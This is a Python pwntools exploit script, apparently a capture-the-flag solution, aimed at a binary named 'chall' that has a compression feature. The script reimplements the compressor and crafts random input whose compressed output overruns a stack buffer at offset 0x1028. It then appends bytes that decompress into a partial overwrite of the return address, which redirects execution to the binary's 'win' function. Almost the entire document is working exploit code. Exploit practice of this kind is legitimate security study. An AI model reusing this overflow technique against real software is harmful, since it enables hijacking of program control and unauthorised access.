#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'chall')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('localhost', 10004)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b* chall+398
b* chall+405
continue
'''.format(**locals())

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

def decompress(compressed):
    pair = [compressed[x*2:(x*2)+2] for x in range(len(compressed)//2)]

    result = b''
    for x in pair:
        if x[0] == 0:
            result = result + bytes([x[1]])
        else:
            offset = x[0]
            size = x[1]

            index = len(result) - offset
            for _ in range(size):
                result += bytes([result[index]])
                index += 1

    return result

def compress(string):
    def lcp(a, b):
        ans = 0
        for x, y in zip(a[:255],b):
            if x != y: break
            ans += 1
        return ans

    compressed = b'\x00' + bytes([string[0]])

    i = 1
    while i < len(string):
        best_index = -1
        best_size = 0

        for j in range(i-1, max(i-256, -1), -1):
            tmp = lcp(string[i:], string[j:])
            if tmp > best_size:
                best_index = j
                best_size = tmp
        
        if best_size == 0:
            compressed += bytes([0, string[i]])
            i += 1
        else:
            compressed += bytes([i-best_index, best_size])
            i += best_size    

    return compressed

# x = random.choices(range(256), k=0x100)
# x = bytes(x)
# cx = compress(x)

# with open("generated", "wb") as f:
#     f.write(cx)

# io = start()

# io.sendline(f'{len(x)}'.encode())
# io.send(x)

# dump = io.recv(8000)

# print(f"compressed: {len(cx)}")
# print(f"Received: {len(dump)}")

# with open("compressed", "wb") as f:
#     f.write(dump)

# io.interactive()

payload = b''
OVERFLOW_OFFSET = 0x1028

if args.GENERATE:

    x = random.choices(range(256), k=0x800)
    x = bytes(x)
    cx = compress(x)

    while len(cx) < OVERFLOW_OFFSET and len(x) < 0x1000:
        x += bytes(random.choices(range(256), k=1))
        cx = compress(x)

    payload = x

    with open("payload", "wb") as f:
        f.write(payload)
else:
    with open("payload", "rb") as f:
        payload = f.read()

cx = compress(payload)
print(f'{len(payload)} -> {len(cx)} (target: {OVERFLOW_OFFSET})')

payload = payload[:-1]

# Trying to add partial overwrite with win function
win_function = p64(exe.symbols['win'] + 8)
offset = win_function[0]
size = win_function[1]

print(f"Trying to append: {offset:#x} - {size:#x}")

to_append = payload[-offset: - offset + size]
if len(to_append) != size+1:
    to_append = to_append * ((size+1) // len(to_append)) + to_append
    to_append = to_append[:size+1]

payload += to_append

io = start()

cx = compress(payload)
print(f'{len(payload)} -> {len(cx)} (target: {OVERFLOW_OFFSET})')

io.sendline(f'{len(payload)}'.encode())
io.sendline(payload)

io.interactive()
